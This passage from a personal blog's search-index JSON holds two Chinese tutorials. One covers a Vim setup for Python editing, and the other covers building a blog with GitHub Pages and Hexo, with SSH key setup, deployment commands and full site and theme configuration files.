蟒蛇解释器位置let g:ycm_global_ycm_extra_conf='~/.vim/.ycm_extra_conf.py'let g:ycm_autoclose_preview_window_after_completion=1 \" 完成操作后自动补全窗口不消失set completeopt=preview \" 补全内容不以分割子窗口形式出现，只显示补全列表let NERDTreeIgnore=['\\.pyc$', '\\~$'] \"ignore files in NERDTree\"显示相关\"set shortmess=atI \"不显示帮助乌干达的提示colorscheme desert \"设置配色方案set showcmd \"输入的命令显示出来syntax on \"语法高亮set tabstop=4 \"Tab键的宽度设为４set softtabstop=4set shiftwidth=4 \"统一缩进为４set autoindent \"开启自动缩进，保持缩进值与上一行相等autocmd InsertLeave * se nocul \"用浅色高亮当前行autocmd InsertEnter * se cul \"用浅色高亮当前行set ruler \"显示当前光标行列位置set mouse=a \"支持鼠标set laststatus=2 \"显示状态栏（默认值为１，无法显示状态栏)if has('gui_running') set t_Co=256endifset guifont=Monoset autoread \"当文件在外部修改时，vim自动更新载入set ignorecase \"搜索时忽略大小写set foldmethod=syntaxset nofoldenable \"此两行为折叠代码\"自定义键映射\"实现CTRL-w保存操作nnoremap &lt;C-w&gt; :w&lt;cr&gt;imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt;\"映射以F12打开NERDTreennoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt;\"映射自动补全括号inoremap ( ()&lt;ESC&gt;iinoremap [ []&lt;ESC&gt;iinoremap { {}&lt;ESC&gt;iinoremap \" \"\"&lt;ESC&gt;iinoremap ' ''&lt;ESC&gt;iset encoding=utf-8set fenc=utf-8set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5set enc=utf-8let &amp;termencoding=&amp;encodingset nu \" 显示行数set nocompatible \" 必须，加载vim自带和插件相应的语法和文件类型相关脚本filetype off \" 必须set list listchars=tab:&gt;-,trail:-,eol:$ \"设定tab键显示为&gt;-,每行行尾显示$set report=0\"python运行配置map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt; \"按F10键进行python调试au BufNewFile,BufRead *.py \"设置py文件支持PEP8风格\\ set tabstop=4r\\ set softtabstop=4\\ set shiftwidth=4\\ set textwidth=79\\ set expandtab\\ set autoindent\\ set fileformat=unix\"auto add pyhton header --start 自动添加py文件头 autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader autocmd BufNewFile *.py ks|call FileName()|'s autocmd BufNewFile *.py ks|call CreatedTime()|'s fun FileName() if line(\"$\") &gt; 10 let l = 10 \"这里是字母L else let l =line(\"$\") endif exe \"1,\".l.\"g/File Name:.*/s/File Name:.*/File Name:\".expand(\"%\")\"最前面是数字1，这里的File Name:和模板中一致endfunfun CreatedTime() if line(\"$\") &gt; 10 let l=10 else let l=line(\"$\") endif exe \"1,\".l.\"g/Created Time:.*/s/Created Time:.*/Created Time:\".strftime(\"%Y-%m-%d %T\")\"这里Create Time:要和模板中一致endfun\"auto add python header --endPlugin 'w0rp/ale'\" 对应语言需要安装相应的检查工具\" https://github.com/w0rp/ale let g:ale_linters_explicit = 1 \"除g:ale_linters指定，其他不可用 let g:ale_linters = {\\ 'python': ['pylint']\\}\"\\ 'cpp': ['cppcheck','clang','gcc'],\"\\ 'c': ['cppcheck','clang', 'gcc'],\"\\ 'bash': ['shellcheck'],\"\\ 'go': ['golint'],let g:ale_sign_column_always = 1let g:ale_completion_delay = 500let g:ale_echo_delay = 20let g:ale_lint_delay = 500let g:ale_echo_msg_format = '[%linter%] %code: %%s'let g:ale_lint_on_text_changed = 'normal'let g:ale_lint_on_insert_leave = 1let g:airline#extensions#ale#enabled = 1\"let g:ale_set_quickfix = 1\"let g:ale_open_list = 1\"打开quitfix对话框let g:ale_c_gcc_options = '-Wall -O2 -std=c99'let g:ale_cpp_gcc_options = '-Wall -O2 -std=c++14'let g:ale_c_cppcheck_options = ''let g:ale_cpp_cppcheck_options = ''let g:ale_sign_error = \"&gt;&gt;\"let g:ale_sign_warning = \"--\"map &lt;F7&gt; ::ALEToggle&lt;CR&gt;\" 你的所有插件需要在下面这行之前call vundle#end() \" 必须filetype plugin indent on \" 必须，加载vim自带和插件相应的语法和文件类型相关脚本 配置解读关于配色方案在我（或你）的/usr/share/vim/vim80/colors/目录，有着自带的一些配色方案，我选择的配色方案是 desert ，看下图；你还可以到网上找一些其他的配色方案来使用，前提是得将找来的配色方案文件放置在此目录下，请注意文件是 .vim 后缀。 如何设置配色方案？很简单，看上方配置文件的第 25 行（colorscheme desert）。将 desert 替换为你喜欢的配色主题名，最后保存退出。 123456$ cd /usr/share/vim/vim80/colors$ lsblue.vim desert.vim koehler.vim peachpuff.vim slate.vimdarkblue.vim elflord.vim morning.vim README.txt torte.vimdefault.vim evening.vim murphy.vim ron.vim zellner.vimdelek.vim industry.vim pablo.vim shine.vim 文件头部信息每次新建一个 Python 文件，会自动生成下图所示的头部信息。 这里得在 ~/.vim/ 目录下创建一个存放模板文件的目录，目录名就叫 vimTemplate ，模板名取为 pythonHeader 1$ mkdir ~/.vim/vimTemplate &amp;&amp; vim pythonHeader 将下面几行写入到模板文件 pythonHeader 之中 1234#!/usr/bin/env python3# -*- coding:utf-8 -*-#File Name:#Created Time: 生成头部的程序，也可看上方配置文件（从第 80 行开始往下看） 12345678910111213141516171819202122232425\"auto add pyhton header --start 自动添加py文件头 autocmd BufNewFile *.py 0r ~/.vim/vimTemplate/pythonHeader autocmd BufNewFile *.py ks|call FileName()|'s autocmd BufNewFile *.py ks|call CreatedTime()|'s fun FileName() if line(\"$\") &gt; 10 let l = 10 \"这里是字母L else let l =line(\"$\") endif exe \"1,\".l.\"g/File Name:.*/s/File Name:.*/File Name:\".expand(\"%\")\"最前面是数字1，这里的File Name:和模板中一致endfunfun CreatedTime() if line(\"$\") &gt; 10 let l=10 else let l=line(\"$\") endif exe \"1,\".l.\"g/Created Time:.*/s/Created Time:.*/Created Time:\".strftime(\"%Y-%m-%d %T\")\"这里Create Time:要和模板中一致endfun\"auto add python header --end Python 运行及代码缩进12345678910\"python运行配置map &lt;F10&gt; :w&lt;cr&gt;:!python3 %&lt;cr&gt;:q&lt;cr&gt; \"按F10键进行python调试au BufNewFile,BufRead *.py \"设置py文件支持PEP8风格\\ set tabstop=4r\\ set softtabstop=4\\ set shiftwidth=4\\ set textwidth=79\\ set expandtab\\ set autoindent\\ set fileformat=unix 介于我的快捷键冲突，所以我将 F10 设置运行该 Python 文件（前提是得先保存）。 代码语法检查前面安装的插件 ALE 以及 pylint ，现在可以对它们进行配置了。这里的缩进语法我已经配置好（仅限Python）。 12345678910111213141516171819202122232425262728Plugin 'w0rp/ale'\" 对应语言需要安装相应的检查工具\" https://github.com/w0rp/ale let g:ale_linters_explicit = 1 \"除g:ale_linters指定，其他不可用 let g:ale_linters = {\\ 'python': ['pylint']\\}\"\\ 'cpp': ['cppcheck','clang','gcc'],\"\\ 'c': ['cppcheck','clang', 'gcc'],\"\\ 'bash': ['shellcheck'],\"\\ 'go': ['golint'],let g:ale_sign_column_always = 1let g:ale_completion_delay = 500let g:ale_echo_delay = 20let g:ale_lint_delay = 500let g:ale_echo_msg_format = '[%linter%] %code: %%s'let g:ale_lint_on_text_changed = 'normal'let g:ale_lint_on_insert_leave = 1let g:airline#extensions#ale#enabled = 1\"let g:ale_set_quickfix = 1\"let g:ale_open_list = 1\"打开quitfix对话框let g:ale_c_gcc_options = '-Wall -O2 -std=c99'let g:ale_cpp_gcc_options = '-Wall -O2 -std=c++14'let g:ale_c_cppcheck_options = ''let g:ale_cpp_cppcheck_options = ''let g:ale_sign_error = \"&gt;&gt;\"let g:ale_sign_warning = \"--\"map &lt;F7&gt; ::ALEToggle&lt;CR&gt; \" 暂时关闭代码检查 其他 显示方面 12345678910111213141516171819202122\"显示相关\"set shortmess=atI \"不显示帮助乌干达的提示colorscheme desert \"设置配色方案set showcmd \"输入的命令显示出来syntax on \"语法高亮set tabstop=4 \"Tab键的宽度设为４set softtabstop=4set shiftwidth=4 \"统一缩进为４set autoindent \"开启自动缩进，保持缩进值与上一行相等autocmd InsertLeave * se nocul \"用浅色高亮当前行autocmd InsertEnter * se cul \"用浅色高亮当前行set ruler \"显示当前光标行列位置set mouse=a \"支持鼠标set laststatus=2 \"显示状态栏（默认值为１，无法显示状态栏)if has('gui_running') set t_Co=256endifset guifont=Monoset autoread \"当文件在外部修改时，vim自动更新载入set ignorecase \"搜索时忽略大小写set foldmethod=syntaxset nofoldenable \"此两行为折叠代码 保存、括号、行数…… 123456789101112131415161718192021\"实现CTRL-w保存操作nnoremap &lt;C-w&gt; :w&lt;cr&gt;imap &lt;C-w&gt; &lt;Esc&gt;:w&lt;cr&gt;\"映射以F12打开NERDTreennoremap &lt;silent&gt; &lt;F12&gt; :NERDTree&lt;CR&gt;\"映射自动补全括号inoremap ( ()&lt;ESC&gt;iinoremap [ []&lt;ESC&gt;iinoremap { {}&lt;ESC&gt;iinoremap \" \"\"&lt;ESC&gt;iinoremap ' ''&lt;ESC&gt;iset encoding=utf-8set fenc=utf-8set fencs=utf-8,usc-bom,euc-jp,gb18030,gbk,gb2312,cp936,big-5set enc=utf-8let &amp;termencoding=&amp;encodingset nu \" 显示行数set nocompatible \" 必须，加载vim自带和插件相应的语法和文件类型相关脚本filetype off \" 必须set list listchars=tab:&gt;-,trail:-,eol:$ \"设定tab键显示为&gt;-,每行行尾显示$set report=0 ………… 差不多就这些吧，这些也就仅仅入门/坑。以后有空再慢慢折腾吧！","link":"/2018/12/13/linux-vim-python/index.html"},{"title":"零基础博客搭建之Github Pages+Hexo","text":"本文是一篇零基础的博客独立搭建教程，将会从最开始的注册Github账号以及Git……到最后的工具推荐。写这篇文章，主要是因为本人博客也刚刚搭建完成；我想把我搭建博客的过程在一篇文章中详详细细的记录下来，放在将来…… MyBlog: FanqXu | FanqXu’Blog https://fanqxu.com，简洁主义。(Update by 2018.12.27) 0x00 前言(可跳过废话)『搭建博客容易，持续写博文困难』，这句话说的真的没错。 作为一个没有网页基础的挨踢狗小白，对于博客的搭建，其实和非IT者一样迷茫。好在善于使用搜索引擎，不管是百度，还是Google,自己动手去查来解决问题就很棒！其次，需要耐心和喜欢折腾；最后，必不可少的学习钻研能力。 其实本人非常建议各位搭建一个独立博客的；无论理工科还是文科，理工科同学可以用它来作技术分享（本人挨踢狗、程序猿一枚），文科亦可拿它来写作输出，我想 This is very goog！！！ 介于本人所使用的操作系统非视窗(Windows)，而是Ubuntu18.04(Linux)；所以会有些步骤和各位所使用的视窗操作系统有所不同。不过不用担心，考虑到视窗的普遍性，我将会重新使用Windows10来重新完成一次博客的搭建。 其实博客搭建有多种方式，这里我将会推荐各位选择较简单的一种方式 Github Pages &amp; Hexo/Jekell Github Pages 作为程序猿，Github是必须知道了解和学习的； Github象征着开源，而开源大势所趋； 顺便了解Git、Github团队协作流程； Hexo 快速、简洁且高效的博客框架 支持Markdown语法，便于博文的编写 插件多 Wordpress https://wordpress.org 其实我不太懂 我们选择第一种方式，Github Pages + Hexo(放弃了Jekell)，这样对于我们小白来说，也会相对轻松一点；而Wordpress 我其实不太懂 就相对复杂，貌似需要自行购买服务器……废话不多说，我们立马正式开始。 0x01 正式开始一、基本软件Node.js点击直接下载：https://nodejs.org/dist/v8.12.0/node-v8.12.0-x64.msi 下载完可在本地文件夹看到；双击打开后，一路next即可安装，等会儿，就安装完毕了！ Git 点击直接下载：https://github.com/git-for-windows/git/releases/download/v2.19.1.windows.1/Git-2.19.1-64-bit.exe 这个和上面一样，一路next就OJBK! 一路next，其他不用管。安装完成后按住你的Win键（视窗键/Super键），找到Git Bash并打开。 然后就是这个样子:到这里基本软件就已完成了…… 二、Github账号注册及仓库创建1. 账号注册这个更简单，虽界面全英文(有英语基础更好)，不过不用担心，都是一些简单的基础的单词。 废话不多说，直接上图: 将页面拖下来至此，你的Github账号就创建完成了…… 2. 仓库创建也很简单，照着图依次就位吧 点击右上角Your repositories 然后再点击右边绿色按钮New之后，先在Repository name中输入username.github.ioDescription中填上“MyBlog”（可选项），其他都默认； 注意：username是你的Github用户名 最后点击Create repository按钮，创建完成。 三、Git及SSH配置Github1. 备份并移除原SSHkey首先,打开Git Bash1$ cd ~/.ssh 如若出现如下，那么恭喜你，这一步不用操作了，直接跳到第二部1\"No such file or directory\" 2. 生成新的SSHkey将引号中的Email换成你的(之前注册Github的邮箱)，另外此处的「-C」的是大写的「C」1ssh-keygen -t rsa -C \"fanqxu@gmail.com\" 这里的话会有个提示：12Enter passphrase (empty for no passphrase):Enter same passphrase again: 提示你输入密码，这里的输入的密码是将来你提交项目时使用，如果为空的话提交项目时则不用输入；我没有输入密码，而是直接回车的；这个设置是防止别人往你的项目里提交内容。 注意：输入密码的时候没有 * 字样的，你直接输入就可以了。到这里，看到上图那样的界面，SSHkey的设置就OJBK了…… 3. 配置到Github首先，先编辑~/.ssh目录下的id_rsa.pub12$ cd ~/.ssh$ vi id_rsa.pub 将这一大串字符复制一下，然后再按下:q!退出…… 打开浏览器中的Github，看图依次点击 最后在回到Git Bash，先测试，然后做Git的最后个人信息配置1$ ssh -T git@GitHub.com 这条命令输完后，可能会出现123The authenticity of host 'github.com (207.97.227.239)' can't be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? No紧张，输入yes就OK，然后你就会看到如下：1Hi gentlyss! You've successfully authenticated, but GitHub does not provide shell access. 最后，配置你的个人账号信息12$ git config --global user.name \"gentlyss\"$ git config --global email.name \"fanqxu@gmail.com\" 注意：&quot;&quot;中的应为你的用户名及Email到这儿，SSH配置完成…… 四、Hexo配置及完成博客搭建1. Hexo安装、初始化、依赖包 在计算机上找个位置新建一个名为username.github.io的文件夹此命名为了方便后期管理…… 双击进入此文件夹，右键点击Git Bash here 1）然后先安装hexo1$ npm install -g hexo-cli 2）其次，初始化1$ hexo init 3）最后，安装依赖包1$ npm install 2. 常用命令、本地服务测试hexo常见的五条命令12345$ hexo new \"postName\" //新建文章$ hexo clean //清除缓存$ hexo generate //生成静态文件，位置在public目录$ hexo server //本地服务，用于预览、测试$ hexo deploy //部署到Github，目前还未配置远程部署，还不可以使用 比如我想新建一篇名为使用GithubPages+Hexo零基础搭建博客博文，就可以这样子：1$ hexo new \"使用GithubPages+Hexo零基础搭建博客\" 完成后，你就可以在source/_posts文件夹中找到使用Github…….md文件，你可以使用你熟悉的编辑器撰写，本人的这篇文章就是使用Atom完成的。 当然，每次对博客做了修改，可按照上述几条命令，就能完成相应部署。 执行完hexo server这条命令时，你就可以打开http://localhost:4000/看到刚刚搭建的本地博客 更多命令用法，可参照Hexo官网，Hexo官方文档是非常推荐阅读的。 3. 部署至Github首先，给各位推荐几个Markdown语法编辑器，有些文件切记不要使用记事本打开； Sublime Text Atom Typora 然后使用上面的Sublime或者原子，打开博客文件夹中的_config.yml文件，划到最下面，123456# Deployment 用于部署到github## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # git提交 repository: git@github.com:fanqxu/fanqxu.github.io.git # 这里的fanqxu应是你的Github用户名 branch: master # 就写master 很简单，按照上面的说明修改，然后安装Hexo的Git deploy插件：1$ npm install hexo-deployer-git --save 完成后就可以部署到Github了，使用下面的命令：1$ hexo deploy 到这部署配置就完成…… 这时，你就可以在任意联网设备上打开你的博客咯， https://yourname.github.io（非此链接） 4. 其他hexo目录结构123456789|-- _config.yml # 全局配置文件|-- package.json # hexo框架的参数和所依赖插件|-- scaffolds # 骨架，基本不用关心|-- source # 很重要的一个目录，里面存放文章和图片…… |-- _posts # 放置文章的目录|-- themes |-- landscape # 默认主题 |-- hexo-theme-next # 第三方主题|-- .gitignore # 不用管 关于配置，可参考我的博客的_config.yml配置 建议这个和实际网页对比着看…… 其中有两份配置文件，一个是博客根目录的全局配置文件；还有一个就主题目录(themes)下的主题配置文件。 首先是全局配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: FanqXu'Blog # 博客名subtitle: Simple, No No No, Is No Simple. # 下方的一句话author: FanqXu # 你名字language: zh-CN # 中文timezone: # 时区，此处不填写，默认本地时区# URL 暂不作配置## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: https://fanqxu.com # 你的网站域名 Note: don't forget to modify the CNAME file to your urlroot: /permalink: :year/:month/:day/:title/ # 年/月/日permalink_defaults:# Site settingsSEOTitle: FanqXu | FanqXu'Blog # 浏览器上方标签栏显示文字email: expertxiao@gmail.com # 你的emaildescription: \"Here is a record of my study and some SAO operation!!!\" # 描述keyword: \" \" ## Build settingsanchorjs: true # if you want to customize anchor. check out line:181 of `post.html`# Sidebar settingssidebar: true # whether or not using Sidebar.sidebar-about-description: \"Hi, I'm FanqXu.\"sidebar-avatar: img/mountietocat.png # use absolute URL, seeing it's used in both `/` and `/about/`# widget behavior## Archivearchive_type: 'monthly'show_count: true# Directory 暂不配置，使用默认值source_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:# Writing 文章布局等，使用默认值new_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: truerelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: true tab_replace:# Category &amp; Tag 使用默认default_category: uncategorizedcategory_map:tag_map:home_posts_tag: true # show posts tags# Date / Time format 默认## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination## Set per_page to 0 to disable paginationper_page: 10 # 每一页显示的文章数pagination_dir: archivesarchive_generator: per_page: 10 yearly: true monthly: true daily: false# Markdown-it config 默认## Docs: https://github.com/celsomiranda/hexo-renderer-markdown-it/wikimarkdown: render: html: true xhtmlOut: false breaks: true linkify: true typographer: true quotes: '“”‘’'## Themes: https://hexo.io/themes/theme: icarus # 放在themes目录下的主题#sitemapsitemap: path: sitemap.xml# Deployment 用于部署到github## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # git提交 repository: git@github.com:fanqxu/fanqxu.github.io.git # 这里的fanqxu应是你的Github用户名 branch: master # 就写master 重要的就是主题配置文件(Update by 2019.01.08) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236# Version of the Icarus theme that is currently usedversion: 2.3.0# Path or URL to the website's iconfavicon: /images/favicon.ico# Path or URL to RSS atom.xmlrss:# Path or URL to the website's logo to be shown on the left of the navigation bar or footerlogo: /images/logo.gif# Open Graph metadata# https://hexo.io/docs/helpers.html#open-graphopen_graph: # Facebook App ID fb_app_id: # Facebook Admin ID fb_admins: # Twitter ID twitter_id: # Twitter site twitter_site: Expert # Google+ profile link #google_plus:# Navigation bar link settingsnavbar: # Navigation bar menu links menu: Home: / Archives: /archives Categories: /categories Tags: /tags About: /about # Navigation bar links to be shown on the right #links: # Download on GitHub: # icon: fab fa-github # url: 'http://github.com/ppoffice/hexo-theme-icarus'# Footer section link settingsfooter: # Links to be shown on the right of the footer section links: Creative Commons: icon: fab fa-creative-commons url: 'https://creativecommons.org/' Attribution 4.0 International: icon: fab fa-creative-commons-by url: 'https://creativecommons.org/licenses/by/4.0/' #Download on GitHub: # icon: fab fa-github # url: 'http://github.com/ppoffice/hexo-theme-icarus'# Article display settingsarticle: # Code highlight theme # https://github.com/highlightjs/highlight.js/tree/master/src/styles highlight: atom-one-light # Whether to show article thumbnail images thumbnail: true # Whether to show estimate article reading time readtime: true# Search plugin settings# http://ppoffice.github.io/hexo-theme-icarus/categories/Configuration/Search-Pluginssearch: # Name of the search plugin type: insight# Comment plugin settings# http://ppoffice.github.io/hexo-theme-icarus/categories/Configuration/Comment-Pluginscomment: # Name of the comment plugin type: valine app_id: sr3jdB7UEto7mridvIc0wVsa-gzGzoHsz app_key: XhGF68GD6Pz8U5XewWhjcL8j notify: true verify: false placeholder:# Donation entries# http://ppoffice.github.io/hexo-theme-icarus/categories/Donation/donate: - # Donation entry name type: alipay # Qrcode image URL qrcode: '/images/alipay.jpg' - # Donation entry name type: wechat # Qrcode image URL qrcode: '/images/wechat.png' - # Donation entry name # type: paypal # Paypal business ID or email address #business: '' # Currency code #currency_code: USD - # Donation entry name #type: patreon # URL to the Patreon page #url: ''# Share plugin settings# http://ppoffice.github.io/hexo-theme-icarus/categories/Configuration/Share-Plugins#ishare: addtoany # Share plugin name# type:# Sidebar settings.# Please be noted that a sidebar is only visible when it has at least one widgetsidebar: # left sidebar settings left: # Whether the left sidebar is sticky when page scrolls # http://ppoffice.github.io/hexo-theme-icarus/Configuration/Theme/make-a-sidebar-sticky-when-page-scrolls/ sticky: true # right sidebar settings right: # Whether the right sidebar is sticky when page scrolls # http://ppoffice.github.io/hexo-theme-icarus/Configuration/Theme/make-a-sidebar-sticky-when-page-scrolls/ sticky: false# Sidebar widget settings█# http://ppoffice.github.io/hexo-theme-icarus/categories/Widgets/widgets: - # Widget name type: profile # Where should the widget be placed, left or right position: left # Author name to be shown in the profile widget author: FanqXu # Title of the author to be shown in the profile widget author_title: 瞎鸡掰写，胡乱造 # Author's current location to be shown in the profile widget location: Wuhan,China # Path or URL to the avatar to be shown in the profile widget avatar: /images/avatar.png # Email address for the Gravatar to be shown in the profile widget #gravatar: # Path or URL for the follow button follow_link: 'http://github.com/FanqXu' # Links to be shown on the bottom of the profile widget social_links: Github: icon: fab fa-github url: 'https://github.com/FanqXu' Facebook: icon: fab fa-facebook url: 'https://www.facebook.com/zhuanjia.xiao.3' Twitter: icon: fab fa-twitter url: 'https://twitter.com/Expert83551161' #Dribbble: # icon: fab fa-dribbble # url: 'http://dribbble.com' RSS: icon: fas fa-rss url: /atom.xml - # Widget name type: toc # Where should the widget be placed, left or right position: left - # Widget name type: links # Where should the widget be placed, left or right position: left # Links to be shown in the links widget links: Hexo: 'https://hexo.io' PPOffice: 'https://github.com/ppoffice' - # Widget name type: category # Where should the widget be placed, left or right position: left - # Widget name type: tagcloud # Where should the widget be placed, left or right position: left - # Widget name type: recent_posts # Where should the widget be placed, left or right position: left - # Widget name type: archive # Where should the widget be placed, left or right position: left - # Widget name type: tag # Where should the widget be placed, left or right position: left# Other plugin settingsplugins: # Enable page animations animejs: true # Enable the lightGallery and Justified Gallery plugins # http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/gallery-plugin/ gallery: true # Enable the Outdated Browser plugin # http://outdatedbrowser.com/ outdated-browser: true # Enable the MathJax plugin # http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/mathjax-plugin/ mathjax: false # Show the back to top button on mobile devices back-to-top: true # Google Analytics plugin settings # http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/site-analytics-plugin/#Google-Analytics google-analytics: # Google Analytics tracking id tracking_id: UA-131397348-1 # Baidu Analytics plugin settings # http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/site-analytics-plugin/#Baidu-Analytics baidu-analytics: # Baidu Analytics tracking id tracking_id: # Hotjar user feedback plugin # http://ppoffice.github.io/hexo-theme-icarus/Plugins/General/site-analytics-plugin/#Hotjar hotjar: # Hotjar site id site_id: # Show a loading progress bar at top of the page progressbar: true # Show the copy button in the highlighted code area clipboard: true# CDN provider settings# http://ppoffice.github.io/hexo-theme-icarus/Configuration/Theme/speed-up-your-site-with-custom-cdn/providers: # Name or URL of the JavaScript and/or stylesheet CDN provider cdn: jsdelivr # Name or URL of the webfont CDN provider fontcdn: google # Name or URL of the webfont Icon CDN provider iconcdn: fontawesome 0x02 美化、博文撰写、更换域名…… 一、修改主题关于主题的话，我想没有谁会想用那一套默认的主题landscape。 当然Hexo官方也提供主题模板： https://hexo.io/themes/ https://github.com/hexojs/hexo/wiki/Themes 提一个使用量多、优雅又强大的主题，这主题对于搞hexo的，可能都晓得吧 next ： https://github.com/theme-next/hexo-theme-next https://theme-next.org/ 我使用的不是此主题 一个实栗： 找到了漂亮的主题，然后就将其下载到本地的themes目录下， 然后修改全局配置文件_config.yml12# Themes: https://hexo.io/themes/theme: next # 这里的名字就是在themes目录下的主题文件夹名字 然后就可以生成部署了……12$ hexo generate$ hexo deploy 二、更换专属域名 这一步如果不做的话，那么访问你博客的方式就是： https://yourname.github.io 当然，这也是全球最大同性社交网站Github免费给我们托管的。 如果你想使用自己花钱买的域名，也可以。你可以到阿里云上的万网或者其他域名厂商那里去选购，不过好的名字早已经被别人买了。(阿里云上的万网需要实名认证) 举个栗子 最后，还要将你买的域名写入到source目录下CNAME文件中，还有_config.yml中也要做出修改。 三、博文撰写 每一篇文章，都得使用Markdown语法撰写。这意味着，你又得多学一份技能，不过也比较简单的。 未完待续吧……无论你是否为IT从业者，我也是建议文科同学能够搞定它，不晓得会不会有种瞬间挤进IT界的自豪感！！！ Enjoy！！！ Thinks： 笨方法学写作 陈素封 http://www.cnfeat.com/blog/2014/05/11/how-to-build-a-blog/ BY http://qiubaiying.top/2017/02/06/快速搭建个人博客","link":"/2018/10/24/零基础博客搭建之Github-Pages-Hexo/index.html"}],"tags":[{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"nc","slug":"nc","link":"/tags/nc/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"conky","slug":"conky","link":"/tags/conky/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Blog","slug":"Blog","link":"/tags/Blog/"},{"name":"root","slug":"root","link":"/tags/root/"},{"name":"kali","slug":"kali","link":"/tags/kali/"},{"name":"个人感悟","slug":"个人感悟","link":"/tags/个人感悟/"},{"name":"Terminal","slug":"Terminal","link":"/tags/Terminal/"},{"name":"隐私","slug":"隐私","link":"/tags/隐私/"},{"name":"DNS","slug":"DNS","link":"/tags/DNS/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"vim","slug":"vim","link":"/tags/vim/"}],"categories":[{"name":"TechShare","slug":"TechShare","link":"/categories/TechShare/"},{"name":"Notes","slug":"Notes","link":"/categories/Notes/"},{"name":"Software","slug":"Software","link":"/categories/Software/"},{"name":"不美化，怎开发","slug":"不美化，怎开发","link":"/categories/不美化，怎开发/"},{"name":"Trivia","slug":"Trivia","link":"/categories/Trivia/"},{"name":"骚姿势","slug":"骚姿势","link":"/categories/骚姿势/"}]}